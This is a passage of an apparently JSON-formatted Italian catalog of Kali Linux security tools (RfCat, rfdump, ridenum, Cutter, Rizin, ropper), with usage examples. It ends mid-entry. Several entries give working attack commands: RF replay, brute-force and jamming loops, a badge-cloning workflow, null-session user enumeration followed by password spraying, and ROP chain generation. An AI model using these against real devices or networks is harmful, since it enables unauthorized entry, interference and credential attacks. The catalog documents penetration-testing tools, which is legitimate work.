    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RfCat</strong> è un framework Python per security research su frequenze radio sub-GHz, progettato per funzionare con hardware dedicato come <strong>YARD Stick One</strong> (Yet Another Radio Dongle) e dongle basati su chip Texas Instruments CC1111. Opera nella banda 300-928 MHz, coprendo le frequenze più comuni usate da dispositivi IoT, telecomandi per garage, sistemi di allarme, sensori wireless, chiavi auto (key fob), e sistemi di controllo industriale. RfCat fornisce una shell Python interattiva (basata su IPython) dove il dongle hardware diventa un oggetto Python controllabile: si possono configurare frequenza, modulazione, data rate, e poi catturare, analizzare, e trasmettere segnali RF con poche righe di codice. Questo lo rende il \"Scapy delle radio\" — flessibile, scriptabile, e potente per chi sa programmare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full Radio Control:</strong> Controllo completo dei parametri radio del chip CC1111: frequenza (300-928 MHz con granularità Hz), modulazione (ASK/OOK, FSK, GFSK, MSK), data rate (fino a 500 kbps), bandwidth, potenza di trasmissione, sync word, e formato pacchetto. Ogni parametro configurabile via API Python.</p><p><strong>Packet Sniffing:</strong> Cattura pacchetti RF raw in tempo reale con demodulazione automatica. I dati catturati sono buffer Python manipolabili direttamente. Supporta cattura continua con callback per analisi in tempo reale di protocolli sconosciuti.</p><p><strong>Replay & Transmission:</strong> Ritrasmette pacchetti catturati (replay attack) o genera pacchetti custom da trasmettere. Per dispositivi che usano codici fissi (no rolling code), un singolo replay è sufficiente per replicare l'azione (aprire garage, disattivare allarme).</p><p><strong>Python Scriptability:</strong> Tutto è scriptabile in Python. Si possono creare tool automatizzati per brute force di codici, fuzzing di protocolli proprietari, scanning di frequenze, e analisi statistica di segnali. La shell IPython permette anche sperimentazione interattiva rapida.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RfCat richiede un dongle YARD Stick One collegato via USB.</p><pre><code># Avvio shell interattiva RfCat\nrfcat -r\n# d è l'oggetto dongle (RfCat)\n\n# === CONFIGURAZIONE RADIO ===\n# Frequenza 433.92 MHz (telecomandi, sensori)\nd.setFreq(433920000)\n\n# Modulazione ASK/OOK (più comune per IoT consumer)\nd.setMdmModulation(MOD_ASK_OOK)\n\n# Data rate\nd.setMdmDRate(4800)\n\n# === SNIFFING ===\n# Cattura singolo pacchetto\ndata, timestamp = d.RFrecv()\nprint(data.encode('hex'))\n\n# Cattura continua con timeout\nwhile True:\n    try:\n        data, ts = d.RFrecv(timeout=5000)\n        print(f\"[{ts}] {data.encode('hex')}\")\n    except Exception:\n        pass\n\n# === REPLAY ATTACK ===\n# 1. Cattura segnale (es. telecomando garage)\nd.setFreq(433920000)\nd.setMdmModulation(MOD_ASK_OOK)\ndata, ts = d.RFrecv()\n\n# 2. Ritrasmetti\nd.RFxmit(data)\n# Se codice fisso → garage si apre\n\n# === BRUTE FORCE ===\n# Brute force codice a 8 bit (256 possibilità)\nimport struct\nfor code in range(256):\n    packet = struct.pack('B', code)\n    d.RFxmit(packet)\n    time.sleep(0.1)\n\n# === FREQUENCY SCANNING ===\n# Scan range per trovare trasmissioni attive\nfor freq in range(433000000, 434000000, 10000):\n    d.setFreq(freq)\n    try:\n        data, ts = d.RFrecv(timeout=500)\n        print(f\"Signal at {freq} Hz: {len(data)} bytes\")\n    except:\n        pass\n\n# === JAMMING (solo per test autorizzati) ===\n# Trasmissione continua sulla frequenza target\nd.setFreq(433920000)\nd.setMaxPower()\nwhile True:\n    d.RFxmit('\\xff' * 100)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IoT Security Assessment</strong>, test di sicurezza su dispositivi wireless sub-GHz: telecomandi, sensori, gateway, smart home. Verifica se usano codici fissi (vulnerabili a replay), codici rolling (più sicuri), o cifratura. Molti dispositivi IoT economici non hanno alcuna protezione.</p><p>Per <strong>Physical Penetration Testing</strong>, attacco a sistemi di accesso basati su RF: badge per cancelli, telecomandi garage aziendali, sistemi di allarme wireless. Se il sistema usa codici fissi, un replay catturato dall'esterno del perimetro può garantire accesso fisico.</p><p>Per <strong>Protocol Reverse Engineering</strong>, analisi di protocolli RF proprietari usati da dispositivi specifici. La flessibilità dell'API Python permette di sperimentare con modulazioni, data rate, e formati pacchetto per decodificare protocolli non documentati.</p><p>Per <strong>Automotive Security Research</strong>, analisi dei segnali key fob (frequenze 315/433 MHz). Molte chiavi auto usano rolling code (KeeLoq, etc.) ma implementazioni deboli possono essere attaccate con tecniche come RollJam.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità Critica:</strong> La trasmissione su frequenze radio senza licenza è regolamentata in tutte le giurisdizioni. Interferire con comunicazioni wireless (jamming) è un reato federale in molti paesi. Anche la semplice trasmissione non autorizzata può violare leggi sulle telecomunicazioni.</p><p><strong>Hardware Required:</strong> Richiede dongle YARD Stick One (~$100) o hardware compatibile con chip CC1111. Senza hardware, il software è inutilizzabile. Il dongle ha range limitato (tipicamente 10-50 metri).</p><p><strong>Rolling Code:</strong> Dispositivi moderni usano rolling code (codice che cambia ad ogni uso). Il semplice replay non funziona. Attacchi come RollJam richiedono jamming simultaneo + cattura, tecnicamente e legalmente più complessi.</p><p><strong>RF Fingerprinting:</strong> Ogni trasmettitore RF ha una \"firma\" unica nei suoi segnali (clock skew, power profile). In teoria, trasmissioni da un YARD Stick One sono distinguibili da quelle di un dispositivo legittimo. Forensics RF è un campo emergente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "rfdump",
    "name": "rfdump",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfdump/",
    "desc": "Legge e scrive tag RFID ISO 15693 per clonazione e analisi di card contactless.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RFDump</strong> è un tool per la lettura, scrittura e analisi di tag RFID conformi allo standard ISO 15693 (vicinity cards) e ISO 14443 (proximity cards). Sviluppato originariamente da Lukas Grunwald, opera su frequenza 13.56 MHz (High Frequency) e permette di interagire con tag RFID contactless a livello di blocchi memoria. ISO 15693 è lo standard usato per tag a lungo raggio (fino a 1-1.5 metri) comunemente impiegati in: sistemi di inventario e logistica, badge di accesso a media sicurezza, etichette per librerie, tracking di asset aziendali, e carte per trasporto pubblico. RFDump fornisce accesso diretto alla struttura memoria del tag: UID (identificatore unico), Application Family Identifier (AFI), Data Storage Format Identifier (DSFID), e i blocchi dati utente riscrivibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Tag Identification:</strong> Legge l'UID (Unique Identifier) del tag — un identificatore hardware unico e immutabile assegnato in fabbrica. Identifica il produttore (IC manufacturer code), il tipo di chip (capacità memoria, dimensione blocchi), e le capability del tag (lock status, multi-block read support).</p><p><strong>Memory Dump:</strong> Legge tutti i blocchi memoria del tag, producendo un dump completo del contenuto. I tag ISO 15693 hanno tipicamente da 32 a 256 blocchi di 4-8 byte ciascuno. Il dump rivela i dati applicativi memorizzati: identificativi, permessi, contatori, o dati custom dell'applicazione.</p><p><strong>Memory Write:</strong> Scrive dati nei blocchi memoria del tag, permettendo di modificare il contenuto applicativo. Questo è il meccanismo base per la clonazione: si legge il dump da un tag sorgente e lo si scrive su un tag vergine compatibile. Supporta anche lock di blocchi per impedire ulteriori modifiche.</p><p><strong>Multi-Standard Support:</strong> Oltre a ISO 15693, versioni estese supportano ISO 14443 (Mifare Ultralight, NTAG), permettendo interazione con una gamma più ampia di tag NFC. L'interfaccia è unificata per entrambi gli standard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RFDump richiede un reader RFID USB compatibile (ACR122U, SCL3711, o reader ISO 15693 dedicati).</p><pre><code># Informazioni sul tag (UID, tipo, produttore)\nrfdump -i\n# Output:\n# UID: E00401007B12A4C5\n# IC Manufacturer: Texas Instruments\n# IC Type: Tag-it HF-I Plus\n# Memory: 64 blocks x 4 bytes\n# Block Size: 4 bytes\n\n# Lettura singolo blocco\nrfdump -r -b 0\n# Block 0: 01 02 03 04\n\n# Dump completo memoria su file binario\nrfdump -d -o tag_dump.bin\n\n# Dump in formato esadecimale leggibile\nrfdump -d -x\n# Block 00: 01 02 03 04\n# Block 01: 05 06 07 08\n# Block 02: 00 00 00 00\n# ...\n\n# Scrittura dati da file (clonazione)\nrfdump -w -i tag_dump.bin\n\n# Scrittura singolo blocco\nrfdump -w -b 5 -data 'AABBCCDD'\n\n# Lock di un blocco (irreversibile!)\nrfdump -l -b 0\n\n# Workflow di clonazione completo:\n# 1. Leggi tag originale\nrfdump -d -o original.bin\n\n# 2. Analizza contenuto\nhexdump -C original.bin\n\n# 3. Scrivi su tag vergine\nrfdump -w -i original.bin\n\n# 4. Verifica\nrfdump -d -o clone.bin\ndiff original.bin clone.bin\n# Se identici → clonazione riuscita</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>RFID Security Audit</strong>, analisi dei tag RFID usati in sistemi aziendali. Verifica se i tag contengono dati in chiaro (senza cifratura), se i blocchi sono protetti da scrittura, e se il sistema di backend valida solo l'UID (facilmente clonabile) o anche il contenuto dei dati.</p><p>Per <strong>Access Control Testing</strong>, in penetration test fisici, clonazione di badge ISO 15693 per verificare se il sistema di accesso è vulnerabile a duplicazione. Molti sistemi economici validano solo l'UID, rendendo la clonazione triviale con un tag vergine.</p><p>Per <strong>Asset Tracking Analysis</strong>, analisi dei dati memorizzati nei tag di tracking: quali informazioni sono esposte (codici prodotto, posizioni, date), se sono cifrate, e se possono essere modificate per manipolare il sistema di inventario.</p><p>Per <strong>Protocol Research</strong>, studio delle implementazioni ISO 15693 di diversi vendor per identificare debolezze specifiche: assenza di autenticazione, password di default per blocchi protetti, o vulnerabilità nei comandi custom.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware Requirement:</strong> Richiede un reader RFID USB compatibile con ISO 15693. Il reader ACR122U (~$30) è il più comune e supportato, ma ha range limitato (3-5 cm). Reader professionali offrono range maggiore.</p><p><strong>Legalità:</strong> Clonazione di card di accesso, badge aziendali, o carte di trasporto senza autorizzazione è illegale. Anche la sola lettura non autorizzata può essere contestata. Usare esclusivamente in contesti di test autorizzati.</p><p><strong>UID Immutability:</strong> L'UID di un tag ISO 15693 standard è immutabile (scritto in fabbrica). Se il sistema di backend verifica l'UID, la clonazione richiede tag speciali con UID programmabile (\"magic\" tags), non sempre disponibili per ISO 15693.</p><p><strong>Proximity Required:</strong> ISO 15693 ha range massimo teorico di 1.5 metri, ma in pratica la lettura affidabile richiede 10-30 cm con reader consumer. Avvicinarsi a badge di altri potrebbe richiedere social engineering.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "ridenum",
    "name": "ridenum",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ridenum/",
    "desc": "Enumera utenti Windows tramite RID cycling su sessioni SMB null session.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RidEnum</strong> è un tool Python per l'enumerazione di utenti Windows attraverso la tecnica di <strong>RID cycling</strong> (o RID brute force) su connessioni SMB. In Windows, ogni account (utente, gruppo, computer) ha un Security Identifier (SID) composto da un prefisso di dominio e un Relative Identifier (RID) numerico. I RID seguono un pattern prevedibile: Administrator è sempre 500, Guest è 501, gli utenti normali partono da 1000 e vengono assegnati sequenzialmente. RidEnum sfrutta questa prevedibilità: stabilisce una connessione SMB (via null session o con credenziali) e interroga il SAM (Security Account Manager) per ogni RID in un range specificato, ottenendo il nome utente associato a ciascun RID valido. Questo permette di enumerare tutti gli utenti di un sistema o dominio senza conoscerne in anticipo i nomi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>RID Cycling:</strong> Itera sistematicamente attraverso un range di RID (tipicamente 500-50000), interrogando il SAM per ciascuno. Per ogni RID valido (associato a un account esistente), restituisce il nome dell'account, il tipo (utente, gruppo, alias), e il SID completo. RID non validi vengono silenziosamente ignorati.</p><p><strong>Null Session Support:</strong> Tenta prima l'enumerazione via null session SMB (nessuna credenziale). Su sistemi legacy o misconfigured, le null session permettono query SAM anonime. Questa è la modalità più potente perché non richiede alcuna conoscenza preliminare del target.</p><p><strong>Authenticated Mode:</strong> Con credenziali valide (anche utente di dominio standard), il RID cycling funziona su qualsiasi sistema Windows. Ogni utente di dominio ha diritto di enumerare gli altri utenti tramite SAM queries.</p><p><strong>SID Discovery:</strong> Prima del cycling, RidEnum identifica il SID del dominio/workgroup interrogando account noti (500=Administrator). Il SID prefix viene poi usato per costruire le query successive, ottimizzando il processo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RidEnum richiede raggiungibilità SMB (porta 445) verso il target.</p><pre><code># Enumeration con null session (no credenziali)\n# Range RID: 500-50000\nridenum.py 192.168.1.10 500 50000\n\n# Output tipico:\n# [+] Establishing null session...\n# [+] Domain SID: S-1-5-21-1234567890-987654321-111222333\n# [+] RID 500: CORP\\Administrator (User)\n# [+] RID 501: CORP\\Guest (User)\n# [+] RID 502: CORP\\krbtgt (User)\n# [+] RID 1000: CORP\\DC01$ (Computer)\n# [+] RID 1001: CORP\\DnsAdmins (Group)\n# [+] RID 1103: CORP\\jsmith (User)\n# [+] RID 1104: CORP\\admin.backup (User)\n# [+] RID 1105: CORP\\svc_sql (User)\n\n# Con credenziali di dominio\nridenum.py 192.168.1.10 500 50000 -u 'CORP\\jsmith' -p 'Password123'\n\n# Range RID ristretto (più veloce)\nridenum.py 192.168.1.10 500 2000\n\n# Range esteso per grandi domini\nridenum.py 192.168.1.10 500 100000\n\n# Alternativa con rpcclient (tool Samba)\n# Null session\nrpcclient -U '' -N 192.168.1.10 -c 'enumdomusers'\n\n# RID lookup singolo\nrpcclient -U '' -N 192.168.1.10 -c 'lookupsids S-1-5-21-...-1103'\n\n# Alternativa con crackmapexec\ncrackmapexec smb 192.168.1.10 -u '' -p '' --rid-brute 50000\n\n# Workflow post-enumeration:\n# 1. Enumera utenti\nridenum.py dc01 500 50000 > users.txt\n\n# 2. Estrai solo username\ngrep 'User' users.txt | awk '{print $3}' | cut -d'\\\\' -f2 > usernames.txt\n\n# 3. Password spraying con lista utenti\ncrackmapexec smb dc01 -u usernames.txt -p 'Winter2024!'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>User Enumeration Pre-Attack</strong>, la lista completa degli utenti è il prerequisito per attacchi basati su password: spraying, brute force, Kerberoasting (che richiede SPN ma beneficia di conoscere tutti gli account). RidEnum produce questa lista anche senza accesso LDAP o credenziali di dominio.</p><p>Per <strong>Privilege Account Discovery</strong>, RID cycling rivela account di servizio (svc_*, admin.*), account di backup, e account amministrativi che potrebbero avere password deboli o essere target per Kerberoasting/AS-REP Roasting.</p><p>Per <strong>Active Directory Reconnaissance</strong>, in fase iniziale quando si ha solo accesso di rete al DC senza credenziali, null session + RID cycling può rivelare la struttura del dominio: utenti, gruppi, computer. Queste informazioni guidano le fasi successive dell'attacco.</p><p>Per <strong>Security Audit</strong>, verifica che null session sia disabilitata e che l'enumerazione anonima non sia possibile. Su sistemi configurati correttamente (RestrictAnonymous=2), il RID cycling anonimo dovrebbe fallire.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Null Session Blocking:</strong> Windows Server 2012+ e Windows 10+ bloccano null session di default (RestrictAnonymous=1 o 2). Il RID cycling anonimo funziona principalmente su sistemi legacy o misconfigured. Con credenziali di dominio, funziona sempre.</p><p><strong>Event Logging:</strong> Ogni connessione SMB e query SAM viene loggata sul target. Event ID 4624 (logon), 4672 (special privileges), e potenzialmente 4661/4662 (SAM access). Il volume di query (migliaia per un range ampio) è anomalo e rilevabile.</p><p><strong>Rate & Volume:</strong> Enumerare 50000 RID genera 50000 query SAM. Su reti monitorate, questo volume è facilmente identificabile. Ridurre il range o rallentare l'iterazione per ridurre la visibilità.</p><p><strong>Alternative Tools:</strong> crackmapexec (<code>--rid-brute</code>), enum4linux-ng, e rpcclient (<code>enumdomusers</code>) offrono funzionalità simili. Con credenziali LDAP, ldapsearch è più discreto per enumerazione utenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "rizin-cutter",
    "name": "rizin-cutter",
    "version": "2.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin-cutter/",
    "desc": "GUI per Rizin/Ghidra: reverse engineering con graph, decompiler, hex editor integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cutter</strong> (noto anche come <strong>Rizin-Cutter</strong>) e l'interfaccia grafica ufficiale del framework Rizin, progettata per rendere il reverse engineering accessibile anche a chi non ha dimestichezza con la riga di comando. Integra nativamente il decompiler Ghidra, offrendo output pseudo-C sincronizzato con il disassembly e il control flow graph. L'interfaccia multi-pannello consente di visualizzare simultaneamente codice assembly, grafo delle funzioni, hex dump e stringhe, riducendo il continuo switching tra tool differenti. Cutter supporta plugin scritti in Python e C++, permettendo agli analisti di estendere le funzionalita con script personalizzati. Rappresenta una valida alternativa open-source a soluzioni commerciali come IDA Pro, particolarmente apprezzata in ambito accademico e nella comunita CTF.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Control Flow Graph interattivo:</strong> Cutter genera automaticamente il grafo del flusso di controllo per ogni funzione analizzata, con nodi colorati per tipo di blocco (condizionale, loop, return). Il grafo e navigabile con zoom e pan, e permette di seguire visivamente il percorso di esecuzione. Il doppio click su un nodo evidenzia il codice corrispondente nel pannello disassembly.</p><p><strong>Decompiler Ghidra integrato:</strong> Grazie al plugin rz-ghidra, Cutter offre decompilazione nativa in pseudo-C direttamente nell'interfaccia. L'output e sincronizzato bidirezionalmente: selezionando una riga nel decompiler si evidenzia l'istruzione corrispondente nel disassembly e viceversa. E possibile rinominare variabili e funzioni direttamente nel codice decompilato, con propagazione automatica a tutti i pannelli.</p><p><strong>Debugger visuale integrato:</strong> Cutter include un debugger completo con supporto per breakpoint hardware e software, stepping (step into, step over, step out) e watch expression. Il pannello registri si aggiorna in tempo reale durante il debugging, e lo stack e la memoria sono ispezionabili tramite hex view dedicata. Supporta il debug remoto tramite gdbserver per analisi su target diversi dalla macchina di analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Cutter si avvia direttamente da terminale o da menu applicazioni. All'apertura di un binario, viene presentata una finestra di configurazione dell'analisi dove e possibile selezionare il livello di profondita (da rapida a completa con risoluzione simboli).</p><pre><code># Avvio dell'interfaccia grafica\ncutter\n\n# Apertura diretta di un binario da terminale\ncutter /path/to/binary\n\n# Una volta aperto il binario:\n# - Tab 'Functions' per lista funzioni rilevate\n# - Doppio click su funzione per graph view\n# - Pannello 'Decompiler' per pseudo-C\n# - View -> Hex Editor per modifica raw bytes\n# - Debug -> Start per avviare debugger</code></pre><p>Per l'analisi di malware e consigliato operare in ambiente isolato (VM) e disabilitare la connessione di rete prima di avviare il debug del campione. L'analisi statica tramite grafo e decompiler non comporta rischi di esecuzione del codice.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nell'ambito della <strong>malware analysis</strong>, Cutter permette di analizzare visualmente sample sospetti senza eseguirli, identificando funzioni critiche come routine di cifratura, comunicazioni C2 e meccanismi di persistenza attraverso il grafo e il decompiler. La possibilita di annotare e rinominare funzioni direttamente nell'interfaccia facilita la documentazione dell'analisi.</p><p>Durante <strong>competizioni CTF</strong>, l'interfaccia intuitiva consente un approccio rapido ai challenge di reversing, con la decompilazione che spesso rivela la logica di validazione flag in pochi secondi. La combinazione di graph view e pseudo-C riduce significativamente il tempo di risoluzione rispetto all'analisi manuale del disassembly.</p><p>Per attivita di <strong>vulnerability research</strong> su software compilato, Cutter facilita l'identificazione di pattern vulnerabili come buffer overflow, use-after-free e integer overflow attraverso l'ispezione del codice decompilato e il tracing del flusso dati nei grafi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Cutter opera esclusivamente in locale sulla macchina dell'analista e non genera traffico di rete durante l'analisi statica. Il debugging attivo di un campione malware potrebbe tuttavia attivare callback di rete se il sample non e adeguatamente sandboxed. Non vi sono rischi di detection da parte del target poiche lo strumento lavora su copie dei binari.</p><p><strong>Impatto operativo:</strong> L'analisi di binari di grandi dimensioni (superiori a 50 MB) puo richiedere quantita significative di RAM e tempo di elaborazione, specialmente durante l'analisi completa con risoluzione simboli. Il decompiler Ghidra integrato produce output pseudo-C che non sempre riflette fedelmente la logica originale, in particolare con codice pesantemente ottimizzato o offuscato. E importante incrociare sempre il decompilato con il disassembly per confermare le conclusioni.</p><p><strong>Mitigazioni:</strong> Utilizzare macchine virtuali dedicate per l'analisi di malware, con snapshot pre-analisi per garantire un ambiente pulito. Per binari molto grandi, considerare l'analisi selettiva di singole funzioni piuttosto che l'analisi completa. Verificare periodicamente la disponibilita di aggiornamenti per il plugin rz-ghidra che migliorano la qualita della decompilazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "rizin",
    "name": "rizin",
    "version": "0.8.1",
    "icon": "../app/icons/rizin-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rizin/",
    "desc": "Fork moderno di Radare2 per analisi binaria, disassembly e reverse engineering.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rizin</strong> e un framework open-source per reverse engineering nato come fork di Radare2, con l'obiettivo di offrire un'interfaccia a riga di comando piu coerente, API stabili e documentazione completa. Mantiene le capacita core di disassembly multi-architettura, debugging, analisi binaria e patching, ma con una sintassi dei comandi razionalizzata e meno criptica rispetto al predecessore. Rizin supporta un numero elevato di architetture tra cui x86, x86-64, ARM, AArch64, MIPS, PowerPC, SPARC e RISC-V. Il framework e estensibile tramite plugin in C e scripting via rz-pipe (Python, JavaScript, Go), e rappresenta il backend della GUI Cutter. La comunita di sviluppo e attiva con rilasci regolari che introducono miglioramenti all'analisi e nuove funzionalita.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi binaria multi-architettura:</strong> Rizin esegue analisi automatica dei binari rilevando funzioni, stringhe, cross-reference, import/export e strutture dati. Il comando <code>aaa</code> avvia l'analisi completa, mentre varianti piu leggere come <code>aa</code> o <code>aab</code> permettono analisi parziali piu rapide. L'engine di analisi identifica automaticamente calling convention, argomenti delle funzioni e variabili locali.</p><p><strong>Debugging integrato:</strong> Il debugger nativo supporta breakpoint hardware e software, stepping a livello di istruzione e funzione, watch expression e modifica dei registri in tempo reale. Supporta debug locale e remoto tramite gdbserver, permettendo l'analisi di processi su target remoti. E possibile effettuare debug di processi in esecuzione tramite attach o avviare binari direttamente sotto il controllo del debugger.</p><p><strong>Scripting e automazione con rz-pipe:</strong> L'interfaccia rz-pipe consente di controllare Rizin da script esterni in Python, JavaScript, Go e altri linguaggi. Questo permette di automatizzare workflow complessi come l'analisi batch di campioni malware, l'estrazione sistematica di indicatori di compromissione o la generazione automatica di report. Gli script possono invocare qualsiasi comando Rizin e processare l'output in formato JSON strutturato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Rizin opera principalmente da riga di comando con un sistema di comandi organizzato gerarchicamente. Ogni lettera iniziale identifica una categoria di comandi (a per analisi, p per print, s per seek, d per debug), e il punto interrogativo dopo una lettera mostra l'help contestuale.</p><pre><code># Apertura binario in modalita analisi\nrizin -A binary_target\n\n# Analisi manuale progressiva\nrizin binary_target\naaa                    # analisi completa\nafl                    # lista funzioni rilevate\nafl~main               # filtra funzioni contenenti 'main'\n\n# Navigazione e disassembly\ns main                 # seek alla funzione main\npdf                    # disassembly della funzione corrente\npdf @sym.check_password  # disassembly funzione specifica\n\n# Ricerca stringhe e pattern\niz                     # lista stringhe nel binario\n/ password             # cerca stringa nel binario\n\n# Debug\nrizin -d binary_target\ndb main                # breakpoint su main\ndc                     # continua esecuzione\nds                     # step singolo</code></pre><p>Per analisi di grandi binari o batch processing, e consigliato utilizzare rz-pipe per automatizzare le operazioni ripetitive e generare output strutturato in JSON tramite il suffisso <code>j</code> ai comandi (es. <code>aflj</code> per lista funzioni in JSON).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>reverse engineering di malware</strong>, Rizin permette l'analisi statica e dinamica di campioni sospetti con la possibilita di automatizzare l'estrazione di IoC tramite scripting. L'analisi delle stringhe, delle funzioni importate e del control flow consente di classificare rapidamente il comportamento del sample senza dipendere da strumenti GUI.</p><p>Per <strong>l'analisi di firmware embedded</strong>, Rizin gestisce nativamente formati binari raw e supporta architetture tipiche dell'IoT come ARM e MIPS. E possibile caricare binari a offset specifici, definire manualmente segmenti di memoria e analizzare codice firmware estratto da dispositivi fisici.</p><p>Nell'ambito delle <strong>competizioni CTF</strong>, Rizin offre un workflow rapido per challenge di reversing e pwn, con la possibilita di identificare velocemente la logica di validazione, calcolare offset per buffer overflow e ispezionare protezioni binarie (RELRO, NX, PIE, canary) tramite il comando <code>iI</code>.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rizin opera interamente in locale e non genera traffico di rete durante l'analisi statica. L'utilizzo del debugger su malware attivo potrebbe attivare routine anti-debug presenti nel campione, portando a comportamenti evasivi o distruttivi. L'analisi non lascia tracce sul sistema target poiche lavora su copie dei file.</p><p><strong>Impatto operativo:</strong> La curva di apprendimento, sebbene ridotta rispetto a Radare2, rimane significativa per chi non ha esperienza con tool da riga di comando per RE. Alcuni plugin sviluppati per Radare2 non sono direttamente compatibili con Rizin a causa delle differenze nelle API. L'analisi completa (<code>aaa</code>) di binari molto grandi puo richiedere tempi e risorse considerevoli.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre ambienti isolati per l'analisi di campioni malware, preferibilmente VM con snapshot. Per binari grandi, preferire analisi parziali (<code>aa</code>) e approfondire solo le funzioni di interesse. Mantenere Rizin aggiornato per beneficiare dei miglioramenti all'engine di analisi e alla compatibilita con nuovi formati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "ropper",
    "name": "ropper",
    "version": "1.13.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ropper/",
    "desc": "Cerca ROP gadgets in binari PE/ELF/Mach-O per exploit development e bypass DEP/ASLR.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ropper</strong> e uno strumento specializzato nella ricerca di gadget ROP (Return-Oriented Programming), JOP (Jump-Oriented Programming) e SYS (System call) all'interno di binari eseguibili. I gadget sono brevi sequenze di istruzioni assembly terminanti con un'istruzione di controllo del flusso (ret, jmp, call, syscall) che possono essere concatenate per costruire payload arbitrari senza iniettare codice eseguibile, bypassando cosi protezioni come DEP/NX. Ropper supporta i formati PE, ELF e Mach-O su architetture x86, x86-64, ARM, MIPS e PowerPC. Include funzionalita avanzate come la ricerca semantica di gadget per operazione desiderata e la generazione automatica di catene ROP per operazioni comuni come l'invocazione di execve. Lo strumento e fondamentale nell'exploit development moderno dove le protezioni di memoria rendono impossibile l'esecuzione diretta di shellcode iniettato.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricerca gadget multi-tipo:</strong> Ropper classifica i gadget in categorie (ROP, JOP, SYS) in base all'istruzione terminale. E possibile filtrare per tipo specifico, per registro coinvolto o per pattern di istruzioni. La ricerca supporta espressioni regolari per individuare sequenze complesse, e il database dei gadget trovati puo essere esportato per analisi successive o integrazione con altri strumenti di exploit development.</p><p><strong>Ricerca semantica e filtri avanzati:</strong> Oltre alla ricerca testuale, Ropper offre la ricerca semantica che permette di specificare l'operazione desiderata (ad esempio \"carica un valore in rdi\") e trovare automaticamente i gadget adatti. I filtri per lunghezza massima del gadget, per registri coinvolti e per assenza di istruzioni indesiderate (come syscall spurie) aiutano a selezionare gadget puliti e affidabili per la costruzione della catena.</p><p><strong>Generazione automatica di catene ROP:</strong> Ropper puo generare automaticamente catene ROP complete per operazioni comuni come l'invocazione di <code>execve(\"/bin/sh\", NULL, NULL)</code> su Linux o <code>VirtualProtect</code> su Windows. Il chain builder seleziona i gadget ottimali dal binario analizzato e genera il payload pronto per l'uso, con output in formato Python per integrazione diretta negli exploit script.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ropper opera da riga di comando con modalita interattiva e non interattiva. La modalita interattiva offre un prompt con autocompletamento dei comandi, particolarmente utile durante la fase esplorativa della ricerca gadget.</p><pre><code># Cerca tutti i gadget ROP in un binario\nropper -f /usr/bin/target_binary\n\n# Cerca gadget contenenti istruzioni specifiche\nropper -f binary --search \"pop rdi; ret\"\nropper -f binary --search \"mov [rdi], rsi\"\n\n# Cerca solo gadget JOP (Jump-Oriented)\nropper -f binary --type jop\n\n# Genera catena ROP per execve\nropper -f binary --chain execve\n\n# Filtra per registro e lunghezza massima\nropper -f binary --search \"pop r??\" --inst-count 3\n\n# Cerca gadget in libreria di sistema\nropper -f /lib/x86_64-linux-gnu/libc.so.6 --search \"syscall; ret\"\n\n# Modalita interattiva\nropper\n(ropper)> file binary\n(ropper)> search pop rdi</code></pre><p>Per exploit 